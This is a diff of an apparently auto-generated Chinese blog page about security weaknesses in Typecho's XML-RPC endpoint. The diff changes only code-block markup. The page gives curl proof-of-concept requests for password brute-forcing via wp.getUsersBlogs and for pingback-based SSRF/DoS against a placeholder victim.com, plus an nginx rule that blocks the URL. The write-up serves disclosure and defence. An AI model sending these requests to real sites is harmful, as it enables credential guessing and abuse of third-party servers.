@@ -71,9 +71,8 @@
 
 <p>POC</p>
 
-<div class="language-shell highlighter-rouge"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> -d <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;{USERNAME}&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;{PASSWORD}&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
-</code></pre>
-</div>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;{USERNAME}&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;{PASSWORD}&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
+</code></pre></div></div>
 
 <h2 id="ping-back造成的dos和ssrf">Ping back造成的dos和SSRF</h2>
 
@@ -85,9 +84,8 @@
 
 <p>POC</p>
 
-<div class="language-shell highlighter-rouge"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> -d <span class="s1">'&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://victim.com&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://example.com/index.php/archives/732/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
-</code></pre>
-</div>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> <span class="nt">-d</span> <span class="s1">'&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://victim.com&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://example.com/index.php/archives/732/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
+</code></pre></div></div>
 
 <p>看到了xml，还顺手测试了一把xxe，不过暂时没有发现这个问题。解析xml时候的本地拒绝服务是存在的，Inutio XML-RPC Library的问题，有两个CVE。</p>
 
@@ -95,11 +93,10 @@
 
 <p>nginx屏蔽此url</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>if ($uri ~ ^/index.php/action/xmlrpc) {
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($uri ~ ^/index.php/action/xmlrpc) {
     return 403;
 }
-</code></pre>
-</div>
+</code></pre></div></div>
 
 
         <section class="author-detail">
